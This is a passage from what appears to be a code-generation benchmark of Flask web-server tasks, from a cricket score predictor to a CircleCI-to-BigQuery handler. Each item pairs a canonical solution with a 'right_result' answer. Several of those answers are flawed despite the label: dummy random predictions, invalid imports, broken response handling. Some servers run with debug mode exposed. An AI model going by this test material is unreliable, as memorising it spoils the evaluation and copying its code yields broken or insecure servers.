Response - Provides information about available methods\n  - Returns: Flask Response - JSON response containing available methods",
    "Canonical_solution": "from flask import Flask, Response, stream_with_context, request\nfrom flask_cors import CORS, cross_origin\nimport json\nimport concurrent.futures\nimport time\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.model = model\n\n        @self.app.route('/stream', methods=['GET', 'POST'])\n        @cross_origin()\n        def stream():\n            data = json.loads(request.data)\n            user_input = data[\"text\"]\n            top_k = data[\"top_k\"]\n            method = data[\"method\"]\n\n            def generate(model):\n                if model.inuse:\n                    return Response(json.dumps({\n                        \"method_name\": \"error\",\n                        \"error\": \"Model in use\"\n                    }), status=409, mimetype='application/json')\n                \n                model.inuse = True\n                with concurrent.futures.ThreadPoolExecutor() as executor:\n                    future = executor.submit(model.run_pipeline, user_input, method, top_k)\n                    while True:\n                        if model.queue.empty():\n                            if future.done():\n                                break\n                            time.sleep(0.01)\n                            continue\n                        else:\n                            obj = model.queue.get()\n                        if obj[\"method_name\"] == \"unknown\": continue\n                        if obj[\"method_name\"] == \"on_request_end\":\n                            yield json.dumps(obj)\n                            break\n\n                        try:\n                            yield json.dumps(obj) + \"\\n\"\n                        except Exception as e:\n                            model.inuse = False\n                            print(e)\n\n                    try:\n                        future.result()\n                    except Exception as e:\n                        model.inuse = False\n                        print(e)\n\n                model.inuse = False\n\n            return Response(stream_with_context(generate(self.model)))\n\n        @self.app.route('/methods', methods=['GET'])\n        @cross_origin()\n        def methods():\n            return Response(json.dumps({\n                \"methods\": [\"DFS_woFilter_w2\"]\n            }), status=200, mimetype='application/json')\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(use_reloader=False, host=host, debug=debug, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Response, jsonify\nfrom flask_cors import CORS\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        self.model = model\n        self.cors = CORS(self.app, resources={r\"/*\": {\"origins\": \"*\"}})\n        self.setup_routes()\n\n    def setup_routes(self):\n        self.app.add_url_rule('/stream', 'stream', self.stream, methods=['POST'])\n        self.app.add_url_rule('/methods', 'methods', self.methods, methods=['GET'])\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(host=host, port=port, debug=debug)\n\n    def stream(self):\n        from flask import request\n        import json\n        import time\n\n        data = request.get_json()\n        if not data or 'input' not in data:\n            return jsonify({\"error\": \"Missing input data\"}), 400\n\n        input_data = data['input']\n        response = Response()\n        response.headers['Content-Type'] = 'text/event-stream'\n        response.headers['Cache-Control'] = 'no-cache'\n        response.headers['Connection'] = 'keep-alive'\n\n        def generate():\n            try:\n                for output in self.model.stream(input_data):\n                    yield f\"data: {json.dumps(output)}\\n\\n\"\n                    time.sleep(0.1)  # Simulate processing delay\n            except Exception as e:\n                yield f\"data: {json.dumps({'error': str(e)})}\\n\\n\"\n\n        return Response(generate(), status=200, response=response)\n\n    def methods(self):\n        return jsonify({\n            'available_methods': ['stream', 'methods']\n        })"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Flask-based web service that predicts cricket match scores based on various input parameters including teams, overs, runs, and wickets.\n\nFunction Description: The `predict()` function is a Flask route handler that processes POST requests containing cricket match data, converts the input into a feature vector, uses a pre-trained model to predict the score range, and returns an HTML response with the prediction.\n\nInput:\n- HTTP POST request with form data containing:\n  - 'batting-team': [str] - Name of the batting team (one of 8 possible teams)\n  - 'bowling-team': [str] - Name of the bowling team (one of 8 possible teams)\n  - 'overs': [float] - Current over count in the match\n  - 'runs': [int] - Total runs scored so far\n  - 'wickets': [int] - Total wickets lost so far\n  - 'runs_in_prev_5': [int] - Runs scored in previous 5 overs\n  - 'wickets_in_prev_5': [int] - Wickets lost in previous 5 overs\n\nOutput:\n- Rendered HTML template ('index1.html') containing:\n  - 'prediction_text': [str] - Formatted string showing predicted score range (prediction \u00b1 margin)",
    "Canonical_solution": "from flask import Flask, render_template, request\nimport pickle\nimport numpy as np\n\nfilename = 'model.pkl'\nregressor = pickle.load(open(filename, 'rb'))\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    temp_array = list()\n    \n    if request.method == 'POST':\n        \n        batting_team = request.form['batting-team']\n        if batting_team == 'Chennai Super Kings':\n            temp_array = temp_array + [1,0,0,0,0,0,0,0]\n        elif batting_team == 'Delhi Daredevils':\n            temp_array = temp_array + [0,1,0,0,0,0,0,0]\n        elif batting_team == 'Kings XI Punjab':\n            temp_array = temp_array + [0,0,1,0,0,0,0,0]\n        elif batting_team == 'Kolkata Knight Riders':\n            temp_array = temp_array + [0,0,0,1,0,0,0,0]\n        elif batting_team == 'Mumbai Indians':\n            temp_array = temp_array + [0,0,0,0,1,0,0,0]\n        elif batting_team == 'Rajasthan Royals':\n            temp_array = temp_array + [0,0,0,0,0,1,0,0]\n        elif batting_team == 'Royal Challengers Bangalore':\n            temp_array = temp_array + [0,0,0,0,0,0,1,0]\n        elif batting_team == 'Sunrisers Hyderabad':\n            temp_array = temp_array + [0,0,0,0,0,0,0,1]\n            \n            \n        bowling_team = request.form['bowling-team']\n        if bowling_team == 'Chennai Super Kings':\n            temp_array = temp_array + [1,0,0,0,0,0,0,0]\n        elif bowling_team == 'Delhi Daredevils':\n            temp_array = temp_array + [0,1,0,0,0,0,0,0]\n        elif bowling_team == 'Kings XI Punjab':\n            temp_array = temp_array + [0,0,1,0,0,0,0,0]\n        elif bowling_team == 'Kolkata Knight Riders':\n            temp_array = temp_array + [0,0,0,1,0,0,0,0]\n        elif bowling_team == 'Mumbai Indians':\n            temp_array = temp_array + [0,0,0,0,1,0,0,0]\n        elif bowling_team == 'Rajasthan Royals':\n            temp_array = temp_array + [0,0,0,0,0,1,0,0]\n        elif bowling_team == 'Royal Challengers Bangalore':\n            temp_array = temp_array + [0,0,0,0,0,0,1,0]\n        elif bowling_team == 'Sunrisers Hyderabad':\n            temp_array = temp_array + [0,0,0,0,0,0,0,1]\n            \n            \n        overs = float(request.form['overs'])\n        runs = int(request.form['runs'])\n        wickets = int(request.form['wickets'])\n        runs_in_prev_5 = int(request.form['runs_in_prev_5'])\n        wickets_in_prev_5 = int(request.form['wickets_in_prev_5'])\n        \n        temp_array = temp_array + [overs, runs, wickets, runs_in_prev_5, wickets_in_prev_5]\n        \n        data = np.array([temp_array])\n        my_prediction = int(regressor.predict(data)[0])\n              \n        return render_template('index1.html',prediction_text=\"Predicted score ranges between {} to {}\".format(my_prediction-10,my_prediction+5))",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport numpy as np\n\napp = Flask(__name__)\n\n# Pre-trained model (placeholder - in a real scenario, this would be loaded from a file)\n# For demonstration purposes, we'll use a simple dummy model\nclass DummyModel:\n    def predict(self, features):\n        # Simple dummy prediction logic\n        return np.random.randint(100, 200)\n\nmodel = DummyModel()\n\n@app.route('/', methods=['POST'])\ndef predict():\n    batting_team = request.form['batting-team']\n    bowling_team = request.form['bowling-team']\n    overs = float(request.form['overs'])\n    runs = int(request.form['runs'])\n    wickets = int(request.form['wickets'])\n    runs_in_prev_5 = int(request.form['runs_in_prev_5'])\n    wickets_in_prev_5 = int(request.form['wickets_in_prev_5'])\n\n    # Convert input to feature vector (simplified for example)\n    features = np.array([\n        overs,\n        runs,\n        wickets,\n        runs_in_prev_5,\n        wickets_in_prev_5\n    ])\n\n    # Predict score range\n    predicted_score = model.predict(features)\n    margin = np.random.randint(10, 20)  # Random margin for demonstration\n\n    # Render HTML template with prediction\n    return render_template('index1.html', prediction_text=f\"Predicted Score: {predicted_score} \u00b1 {margin}\")\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Flask web application that handles HTTP requests on a '/hello' endpoint, processes form data, and returns a rendered HTML template with the processed data.\n\nFunction Description: The function 'hello' is a Flask route handler that responds to both GET and POST requests at the '/hello' endpoint. It retrieves form data from the request, processes it, and renders an HTML template ('greeting.html') with the form data as template variables.\n\nInput: \n- The function receives HTTP requests (GET or POST) containing form data with two fields:\n  - 'say': [str] - The greeting message to be displayed\n  - 'to': [str] - The recipient of the greeting\n\nOutput:\n- Returns a rendered HTML template ('greeting.html') populated with the form data:\n  - Template variable 'say' contains the greeting message\n  - Template variable 'to' contains the recipient name",
    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route('/hello', methods=['GET', 'POST'])\ndef hello():\n    return render_template('greeting.html', say=request.form['say'], to=request.form['to'])\n\nif __name__ == \"__main__\":\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.route('/hello', methods=['GET', 'POST'])\ndef hello():\n    if request.method == 'POST':\n        say = request.form['say']\n        to = request.form['to']\n        return render_template('greeting.html', say=say, to=to)\n    return render_template('greeting.html')\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes Pub/Sub messages containing CircleCI event data, validates and extracts relevant information, and stores it in BigQuery. The endpoint should handle JSON payloads, validate message structure, and process specific CircleCI event types.\n\nFunction Description: The `index` function is a Flask route handler for POST requests at the root path (\"/\"). It receives Pub/Sub messages containing CircleCI event data, validates the message structure, processes the event if it's a supported type, and stores the processed data in BigQuery. Invalid messages or processing errors are logged with appropriate warnings.\n\nInput: \n- HTTP POST request with JSON payload containing Pub/Sub message format:\n  {\n    \"message\": {\n      \"attributes\": {\n        \"headers\": \"JSON string containing CircleCI headers\",\n        ...other attributes\n      },\n      \"data\": \"base64-encoded event data\",\n      \"message_id\": \"unique message identifier\"\n    }\n  }\n\nOutput: \n- HTTP response with status code 204 (No Content) on successful processing\n- Error responses with appropriate status codes for invalid requests\n- Warning logs for processing errors that don't prevent HTTP response\n\nThe `process_circleci_event` helper function processes valid CircleCI events by extracting and formatting relevant data from the message.\n\nFunction Description: The `process_circleci_event` function extracts and formats CircleCI event data from message headers and payload. It validates the event type and creates a standardized event object for storage.\n\nInput:\n- headers: dict - Contains CircleCI event metadata including:\n  - \"Circleci-Event-Type\": string - The type of CircleCI event\n  - \"Circleci-Signature\": string - Verification signature\n- msg: dict - The Pub/Sub message containing:\n  - \"data\": string - base64-encoded JSON payload\n  - \"message_id\": string - Unique message identifier\n\nOutput:\n- dict - Formatted event data containing:\n  - \"event_type\": string - CircleCI event type\n  - \"id\": string - Event identifier\n  - \"metadata\": string - JSON string of full event data\n  - \"time_created\": string - Timestamp of event\n  - \"signature\": string - Verification signature\n  - \"msg_id\": string - Pub/Sub message ID\n  - \"source\": string - Constant \"circleci\" identifier",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    \"\"\"\n    Receives messages from a push subscription from Pub/Sub.\n    Parses the message, and inserts it into BigQuery.\n    \"\"\"\n    event = None\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        attr = msg[\"attributes\"]\n\n        if \"headers\" in attr:\n            headers = json.loads(attr[\"headers\"])\n\n            if \"Circleci-Event-Type\" in headers:\n                event = process_circleci_event(headers, msg)\n\n        shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(json.dumps(entry))\n\n    return \"\", 204\n\ndef process_circleci_event(headers, msg):\n    event_type = headers[\"Circleci-Event-Type\"]\n    signature = headers[\"Circleci-Signature\"]\n    metadata = json.loads(base64.b64decode(msg[\"data\"]).decode(\"utf-8\").strip())\n    types = {\"workflow-completed\", \"job-completed\"}\n\n    if event_type not in types:\n        raise Exception(\"Unsupported CircleCI event: '%s'\" % event_type)\n\n    circleci_event = {\n        \"event_type\": event_type,\n        \"id\": metadata[\"id\"],\n        \"metadata\": json.dumps(metadata),\n        \"time_created\": metadata[\"happened_at\"],\n        \"signature\": signature,\n        \"msg_id\": msg[\"message_id\"],\n        \"source\": \"circleci\",\n    }\n\n    return circleci_event",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport base64\nimport json\nimport logging\nimport re\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\n# Initialize BigQuery client\nclient = bigquery.Client()\n\ndef process_circleci_event(headers, msg):\n    event_type = headers.get(\"Circleci-Event-Type\")\n    signature = headers.get(\"Circleci-Signature\")\n    data = msg.get(\"data\")\n    message_id = msg.get(\"message_id\")\n\n    if not all([event_type, signature, data, message_id]):\n        logging.warning(\"Missing required fields in message\")\n        return None\n\n    try:\n        # Decode data\n        decoded_data = base64.b64decode(data).decode('utf-8')\n        event_data = json.loads(decoded_data)\n    except (TypeError, ValueError, KeyError) as e:\n        logging.warning(f\"Error decoding or parsing event data: {str(e)}\")\n        return None\n\n    # Validate event type\n    supported_events = [\"push\", \"pull_request\", \"deployment\"]\n    if event_type not in supported_events:\n        logging.warning(f\"Unsupported event type: {event_type}\")\n        return None\n\n    # Create formatted event data\n    event = {\n        \"event_type\": event_type,\n        \"id\": event_data.get(\"id\"),\n        \"metadata\": json.dumps(event_data),\n        \"time_created\": event_data.get(\"time_created\"),\n        \"signature\": signature,\n        \"msg_id\": message_id,\n        \"source\": \"circleci\"\n    }\n\n    # Insert into BigQuery\n    try:\n        job_config = bigquery.LoadJobConfig(\n            schema=[{\n                \"name\": \"event_type\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"id\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"metadata\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"time_created\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"signature\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"msg_id\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }, {\n                \"name\": \"source\",\n                \"type\": \"STRING\",\n                \"mode\": \"REQUIRED\"\n            }]\n        )\n        job_config.source_uris = [\"bq://your_dataset.your_table\"]\n        job_config.write_disposition = bigquery.WriteDisposition.WRITE_TRUNCATE\n\n        load_job = client.load_table_from_uri(\n            \"bq://your_dataset.your_table\",\n            job_config=job_config\n        )\n        load_job.result()\n        logging.info(\"Loaded {} rows into table.\".format(load_job.output_count))\n    except Exception as e:\n        logging.warning(f\"Error inserting into BigQuery: {str(e)}\")\n\n    return event\n\n@app.route('/', methods=['POST'])\ndef index():\n    try:\n        data = request.json\n        pubsub_message = data.get(\"message\")\n        if not pubsub_message:\n            return jsonify({\"error\": \"Missing 'message' field\"}), 400\n\n        attributes = pubsub_message.get(\"attributes\")\n        data_field = pubsub_message.get(\"data\")\n        message_id = pubsub_message.get(\"message_id\")\n\n        if not all([attributes, data_field, message_id]):\n            return jsonify({\"error\": \"Missing required fields in message\"}), 400\n\n        # Extract headers from attributes\n        headers_str = attributes.get(\"headers\")\n        if not headers_str:\n            return jsonify({\"error\": \"Missing 'headers' attribute\"}), 400\n\n        try:\n            headers = json.loads(headers_str)\n        except json.JSONDecodeError:\n            return jsonify({\"error\": \"Invalid JSON in 'headers' attribute\"}), 400\n\n        # Process event\n        event = process_circleci_event(headers, {\"data\": data_field, \"message_id\": message_id})\n        if not event:\n            return jsonify({\"error\": \"Failed to process event\"}), 500\n\n        return jsonify({\"status\": \"success\"}), 204\n\n    except Exception as e:\n        logging.warning(f\"Error processing request: {str(e)}\")\n        return jsonify({\"error\": \"Internal server error\"}), 500\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Python class that implements a web server using Flask framework with authentication, search functionality, and WebSocket support. The server should handle HTTP requests, manage user sessions, and provide search capabilities against a data model.\n\nClass Description: MalcomWeb is a Process subclass that implements a web server with Flask. It handles HTTP requests, manages authentication, provides search functionality against a data model, and supports WebSocket connections. The server can be configured through a setup dictionary and runs in its own process.\n\nAttributes:\n\nlisten_port: [int] - The port number on which the server listens\nlisten_interface: [str] - The network interface on which the server listens\nsetup: [dict] - Configuration dictionary for server settings\nhttp_server: [WSGIServer] - Instance of the WSGI server\napp: [Flask] - Flask application instance\n\nMethods:\n\n__init__: [Name](auth, listen_port, listen_interface, setup) -> [None] - Initializes the web server process with authentication settings, port, interface, and configuration\nrun: [Name]() -> [None] - Starts the server process (inherited from Process)\nstop_server: [Name]() -> [None] - Stops the server (currently just a placeholder)\nstart_server: [Name]() -> [None] - Configures and starts the Flask application with routes and WebSocket support\nindex: [Name]() -> [Response] - Route handler for the root URL (requires login)\nsearch: [Name](term=\"\") -> [Response] - Route handler for search functionality (requires login), processes both GET and POST requests",
    "Canonical_solution": "from flask import Flask, request, render_template, redirect, url_for, make_response\nfrom gevent.pywsgi import WSGIServer\nfrom geventwebsocket.handler import WebSocketHandler\nfrom multiprocessing import Process\n\nclass MalcomWeb(Process):\n    def __init__(self, auth, listen_port, listen_interface, setup):\n        super(MalcomWeb, self).__init__()\n        self.setup = setup\n        self.listen_port = setup['LISTEN_PORT']\n        self.listen_interface = setup['LISTEN_INTERFACE']\n        self.http_server = None\n        self.app = Flask(__name__)\n        self.app.secret_key = os.urandom(24)\n        self.app.debug = True\n\n    def run(self):\n        self.start_server()\n\n    def stop_server(self):\n        pass\n\n    def start_server(self):\n        if not self.setup['AUTH']:\n            self.app.config['LOGIN_DISABLED'] = True\n\n        self.app.config['MODEL'] = ModelClass(self.setup)\n        self.app.config['USER_MANAGER'] = UserManagerClass(self.setup)\n\n        lm.init_app(self.app)\n        lm.login_view = 'login'\n        lm.session_protection = 'strong'\n        lm.anonymous_user = self.app.config['USER_MANAGER'].get_default_user\n\n        for key in self.setup:\n            self.app.config[key] = self.setup[key]\n        self.app.config['UPLOAD_DIR'] = \"\"\n\n        self.app.config['MESSENGER'] = WebMessenger()\n\n        @self.app.route('/')\n        @login_required\n        def index():\n            return redirect(url_for('search'))\n\n        @self.app.route('/search/', methods=['GET', 'POST'])\n        @login_required\n        def search(term=\"\"):\n            if request.method == 'POST':\n                field = 'value'\n                query = [{field: r.strip()} for r in request.form['bulk-text'].split('\\r\\n') if r.strip() != '']\n                result_set = self.app.config['MODEL'].find({'$or': query})\n            else:\n                query = request.args.get('query', False)\n                if query:\n                    query = query.strip()\n                field = request.args.get('field', 'value').strip()\n                if not bool(request.args.get('strict', False)):\n                    result_set = self.app.config['MODEL'].find({field: query})\n                else:\n                    result_set = self.app.config['MODEL'].find({field: re.compile(re.escape(query), re.IGNORECASE)})\n\n            if query == False:\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n            elif query == \"\":\n                flash('Empty search query is empty.')\n                return redirect(url_for('search'))\n\n            base_elts = []\n            base_ids = []\n            evil_elts = {}\n\n            for e in result_set:\n                base_elts.append(e)\n                base_ids.append(e['_id'])\n                if 'evil' in e['tags']:\n                    evil_elts[e['_id']] = e\n\n            if len(base_elts) == 0 and request.method == 'GET':\n                if not bool(request.args.get('log', False)):\n                    flash('\"{}\" was not found. Use the checkbox above to add it to the database'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n                else:\n                    new = self.app.config['MODEL'].add_text([query], tags=['search'])\n                    if new:\n                        flash('\"{}\" was not found. It was added to the database (ID: {})'.format(query, new['_id']))\n                        self.app.config['MODEL'].add_to_history(query)\n                    else:\n                        flash('\"{}\" did not convert to a viable datatype'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n\n            if len(base_elts) == 0 and request.method == 'POST':\n                flash('Your query did not yield any results. Use the checkbox above to add it to the database')\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n\n            return find_related(field, query, base_elts, base_ids, evil_elts)\n\n        self.http_server = WSGIServer((self.listen_interface, self.listen_port), self.app, handler_class=WebSocketHandler)\n        self.http_server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, redirect, url_for, session, render_template, Response\nfrom flask_socketio import SocketIO, emit\nimport threading\nimport socket\nimport json\nfrom wsgiref.simple_server import WSGIServer\n\nclass MalcomWeb:\n    def __init__(self, auth, listen_port, listen_interface, setup):\n        self.listen_port = listen_port\n        self.listen_interface = listen_interface\n        self.setup = setup\n        self.auth = auth\n        self.app = Flask(__name__)\n        self.app.config['SECRET_KEY'] = 'secret!'\n        self.socketio = SocketIO(self.app, cors_allowed_origins=\"*\")\n        self.http_server = WSGIServer((listen_interface, listen_port), self.app)\n        self.users = {}\n        self.data_model = {}\n\n    def run(self):\n        threading.Thread(target=self.start_server).start()\n\n    def stop_server(self):\n        pass\n\n    def start_server(self):\n        @self.app.route('/')\n        def index():\n            if 'user' not in session:\n                return redirect(url_for('login'))\n            return render_template('index.html')\n\n        @self.app.route('/login', methods=['GET', 'POST'])\n        def login():\n            if request.method == 'POST':\n                username = request.form['username']\n                password = request.form['password']\n                if self.auth.authenticate(username, password):\n                    session['user'] = username\n                    return redirect(url_for('index'))\n            return render_template('login.html')\n\n        @self.app.route('/search', methods=['GET', 'POST'])\n        def search():\n            if 'user' not in session:\n                return redirect(url_for('login'))\n            term = request.args.get('term') or request.form.get('term', '')\n            results = self.data_model.search(term)\n            return render_template('search.html', results=results)\n\n        @self.socketio.on('connect')\n        def handle_connect():\n            print('Client connected')\n\n        @self.socketio.on('message')\n        def handle_message(message):\n            print('Received message:', message)\n            emit('response', 'Echo: ' + message)\n\n        self.socketio.run(self.app, host=self.listen_interface, port=self.listen_port)\n\n    def authenticate(self, username, password):\n        return username in self.users and self.users[username] == password\n\n    def search(self, term):\n        return [item for item in self.data_model if term.lower() in item.lower()]"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Flask-based REST API for user management with configurable behaviors for testing various API scenarios.\n\nClass Description: FlaskAPI is a class that implements a RESTful API server using Flask. It provides endpoints for user CRUD operations and order deletion, with configurable behaviors to simulate different API response scenarios for testing purposes.\n\nAttributes:\n\napp: [Flask] - The Flask application instance\nconfig: [AppConfig] - Configuration object controlling API behavior\nnext_user_id: [int] - Counter for generating new user IDs\nlast_modified: [str] - Timestamp for last modification\nusers: [dict] - Dictionary storing user data\ndeleted_orders: [set] - Set tracking deleted order IDs\n\nMethods:\n\n__init__: [None]() -> [None] - Initializes the Flask application and sets up routes\n_setup_routes: [None]() -> [None] - Private method that defines all API endpoints\nget_spec: [None]() -> [Response] - Returns OpenAPI specification\nget_user: [None](user_id: int) -> [Response] - Retrieves a user by ID\nlist_users: [None]() -> [Response] - Lists all users\ncreate_user: [None]() -> [Response] - Creates a new user\nupdate_user: [None](user_id: int) -> [Response] - Updates a user by ID\ndelete_user: [None](user_id: int) -> [Response] - Deletes a user by ID\ndelete_order: [None](order_id: str) -> [Response] - Handles order deletion\ncheck_auth: [None]() -> [None] - Middleware for authorization checking",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom typing import Literal, Union\nfrom dataclasses import dataclass\n\n@dataclass\nclass AppConfig:\n    use_after_free: bool = False\n    ensure_resource_availability: bool = False\n    merge_body: bool = True\n    independent_500: bool = False\n    failure_behind_failure: bool = False\n    multiple_conformance_issues: bool = False\n    unsatisfiable: bool = False\n    custom_headers: dict | None = None\n    multiple_source_links: bool = False\n    auth_token: str | None = None\n    ignored_auth: bool = False\n    slowdown: float | int | None = None\n    multiple_incoming_links_with_same_status: bool = False\n    duplicate_operation_links: bool = False\n    circular_links: bool = False\n    invalid_parameter: bool = False\n    list_users_as_root: bool = False\n    no_reliable_transitions: bool = False\n    return_plain_text: Literal[False] | str | bytes = False\n    omit_required_field: bool = False\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.config = AppConfig()\n        self.next_user_id = 1\n        self.last_modified = \"2021-01-01T00:00:00Z\"\n        self.users = {0: {\"id\": 0, \"name\": \"John Doe\", \"last_modified\": self.last_modified}}\n        self.deleted_orders = set()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/openapi.json\", methods=[\"GET\"])\n        def get_spec():\n            return jsonify(self.app.config[\"schema\"])\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"GET\"])\n        def get_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                if self.config.return_plain_text is not False:\n                    return self.config.return_plain_text, 200, {\"Content-Type\": \"text/plain\"}\n                if self.config.omit_required_field:\n                    return jsonify({\"name\": user[\"name\"], \"last_modified\": user[\"last_modified\"]})\n                return jsonify(user)\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/users\", methods=[\"GET\"])\n        def list_users():\n            return jsonify(self.users)\n\n        @self.app.route(\"/users\", methods=[\"POST\"])\n        def create_user():\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            data = request.get_json()\n            if not isinstance(data, dict):\n                return jsonify({\"error\": \"Invalid input\"}), 400\n            name = data.get(\"name\")\n            if name is None:\n                return jsonify({\"error\": \"Name is required\"}), 400\n\n            new_user = {\"id\": self.next_user_id, \"name\": name, \"last_modified\": self.last_modified}\n            if not self.config.ensure_resource_availability:\n                self.users[self.next_user_id] = new_user\n            self.next_user_id += 1\n\n            if self.config.omit_required_field:\n                return jsonify({\"name\": new_user[\"name\"], \"last_modified\": new_user[\"last_modified\"]}), 201\n            return jsonify(new_user), 201\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"PATCH\"])\n        def update_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                data = request.get_json()\n                if not self.config.merge_body:\n                    assert len(data) == 1\n                else:\n                    assert \"name\" in data\n                    user[\"name\"] = data[\"name\"]\n                return jsonify(user)\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/users/<int:user_id>\", methods=[\"DELETE\"])\n        def delete_user(user_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            user = self.users.get(user_id)\n            if user:\n                if self.config.use_after_free:\n                    if len(user[\"name\"]) < 10:\n                        del self.users[user_id]\n                else:\n                    del self.users[user_id]\n                return jsonify({\"message\": \"User deleted successfully\"}), 204\n            return jsonify({\"error\": \"User not found\"}), 404\n\n        @self.app.route(\"/orders/<order_id>\", methods=[\"DELETE\"])\n        def delete_order(order_id):\n            if self.config.slowdown:\n                time.sleep(self.config.slowdown)\n            if order_id in self.deleted_orders:\n                return jsonify({\"error\": \"Order not found\"}), 404\n            self.deleted_orders.add(order_id)\n            return jsonify({\"message\": \"Nothing happened\"}), 200\n\n        @self.app.before_request\n        def check_auth():\n            if not (self.config.ignored_auth or self.config.auth_token is None or request.endpoint == get_spec.__name__):\n                auth_header = request.headers.get(\"Authorization\")\n                if not auth_header:\n                    abort(401, description=\"Authorization header is missing\")\n                try:\n                    token_type, token = auth_header.split()\n                    if token_type.lower() != \"bearer\" or token != self.config.auth_token:\n                        abort(401, description=\"Invalid token\")\n                except ValueError:\n                    abort(401, description=\"Invalid Authorization header format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_restful import Api, Resource\nfrom flask_swagger_ui import SWAGGERUI\nfrom flask_swagger import swagger\nimport uuid\nimport time\nfrom datetime import datetime\n\nclass AppConfig:\n    def __init__(self):\n        self.return_404 = False\n        self.return_400 = False\n        self.return_401 = False\n        self.return_500 = False\n        self.return_201 = False\n        self.return_200 = False\n        self.return_409 = False\n        self.return_403 = False\n        self.return_405 = False\n        self.return_408 = False\n        self.return_410 = False\n        self.return_411 = False\n        self.return_412 = False\n        self.return_413 = False\n        self.return_414 = False\n        self.return_415 = False\n        self.return_416 = False\n        self.return_417 = False\n        self.return_422 = False\n        self.return_423 = False\n        self.return_424 = False\n        self.return_425 = False\n        self.return_426 = False\n        self.return_428 = False\n        self.return_429 = False\n        self.return_431 = False\n        self.return_501 = False\n        self.return_502 = False\n        self.return_503 = False\n        self.return_504 = False\n        self.return_505 = False\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.config = AppConfig()\n        self.next_user_id = 1\n        self.last_modified = datetime.now().isoformat()\n        self.users = {}\n        self.deleted_orders = set()\n        self.api = Api(self.app)\n        self._setup_routes()\n        self.app.before_request(self.check_auth)\n        self.app.after_request(self._after_request)\n        self.swaggerui = SWAGGERUI(self.app, \"/swagger.json\", \"/swagger-ui/\")\n    \n    def _setup_routes(self):\n        self.api.add_resource(self.get_spec, '/swagger.json')\n        self.api.add_resource(self.get_user, '/users/<int:user_id>')\n        self.api.add_resource(self.list_users, '/users')\n        self.api.add_resource(self.create_user, '/users')\n        self.api.add_resource(self.update_user, '/users/<int:user_id>')\n        self.api.add_resource(self.delete_user, '/users/<int:user_id>')\n        self.api.add_resource(self.delete_order, '/orders/<string:order_id>')\n    \n    def get_spec(self):\n        spec = swagger.spec(self.app)\n        return jsonify(spec)\n    \n    def get_user(self, user_id):\n        if user_id not in self.users:\n            return 